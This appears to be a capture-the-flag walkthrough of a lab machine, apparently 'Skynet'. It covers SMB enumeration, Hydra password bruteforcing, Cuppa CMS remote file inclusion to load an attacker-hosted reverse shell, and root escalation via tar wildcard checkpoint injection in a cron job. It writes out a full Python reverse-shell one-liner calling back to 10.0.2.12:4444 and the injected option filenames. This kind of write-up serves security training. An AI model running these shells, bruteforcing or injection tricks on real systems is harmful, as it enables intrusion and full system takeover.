> Bruteforcing, exploiting tar binary, crontab

# Ports

* **80** : Apache httpd 2.4.18
* **22** : OpenSSH 7.2p2
* **110** : Dovecot pop3d
* **143** : Dovecot imapd
* **139, 445** : Samba smbd 4.3.11-Ubuntu
### Port 80, 139 are used for exploiting

# 80
1. `gobuster` gave /config, /css, /js, /admin, /ai, /squirrelmail. Out of these only /squirrelmail is accessible to us.
2. Squirrelmail requires a valid login.


# 139,445 
1. samba version 4.3.11. 
2. `smbclient -L \\\\10.10.220.111\\` we see two shares: anonymous and milesdyson. A possible 'milesdyson' user in the smb system.
3. `smbclient \\10.10.220.111\anonymous -U guest` contains attention.txt, log1.txt, log2.txt, log3.txt.
4. `attention.txt` tells an incident about password change and it is written by 'Myles dyson'. `log1.txt` contains a list of possible passwords. `log2.txt, log3.txt` are empty.
5. We can try bruteforcing the samba share 'milesdyson' with log1.txt and a possible username 'miles'. Hydra shows error at the first attempt stating username is not valid. So we tried with `milesdyson` and it didn't give a valid password but it confirmed the username as 'milesdyson'

# 110, 143
1. pop3 and imap3 services didn't permit login via cleartext as we tried bruteforcing with hydra using login `milesdyson` and the `log1.txt` password list. Also the `-S` switch for SSL connect in hydra didn't work for me.


# 80 - /squirrelmail
1. The first password in the list log1.txt gave us the login. Username : `milesdyson`  Password: `cyborg007haloterminator`
2. The mail list contains a mail from 'skynet' which gave us the password for 'miledyson' share in the samba. Password: `)s{A&2Z=F^n_E.B``
3. Other mails weren't useful

# 139, 445 - /milesdyson
1. `smbclient \\10.10.220.111\milesdyson -U milesdyson`  with password from the mail logged us in.
2. The share contains AI related files for his work and sifting through the files we found `important.txt` which tells us that a `beta` cms exists at `/45kra24zxs28v3yd` in the web server.

# EXPLOITATION

Navigating /45kra24zxs28v3yd we see a picture of milesdyson and the login page for the cms is at /45kra24zxs28v3yd/administrator.
The cms is `Cuppa CMS` and searchsploit tells us that an RCE exploit exists for the beta version.
The [exploitdb entry](https://www.exploit-db.com/exploits/25971) tells us that the cms is vulnerable to both **RFI** and **LFI**. So we can follow the steps mentioned in the exploitdb entry to get a shell.

`10.10.125.47/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.0.2.12:8000/rev_shell.php` 
rev_shell.php is hosted on our server. 
We get a shell.

# Actions in the low privilege shell
1. At /home/milesdyson a directory named 'backups' is owned by root and inside the directory there is a shell script to backup the content of /var/www/html using the  `tar` binary with **wildcard character**.
2. `/etc/crontab` tells us that this `backup.sh` runs every minute.
3. From [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) article, we can get priv esc by abusing the wildchard character in several ways. Here we are going with the reverse shell route.
4. So we cd into `/var/www/html` 
	- `echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.12\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > rev.sh`
	To create the reverse shell executable. Also increase its permission to 777.
	- `echo "" > "--checkpoint=1"`, To set the option of the tar binary
	- `echo "" > "--checkpoint-action=exec='sh rev.sh'"`, To execute the reverse shell binary when checkpoint is reached.
	
5. We get the root shell within a minute or so.

We are now root.

P.S: The kernel version of the target `4.8.0-58` is vulnerable to a memory corruption (CVE-2017-1000112) which can be exploited to gain local privilege escalation. Related exploit in [exploitdb](https://www.exploit-db.com/exploits/43418). Since the target has gcc we can compile and run the exploit inside the target itself. 
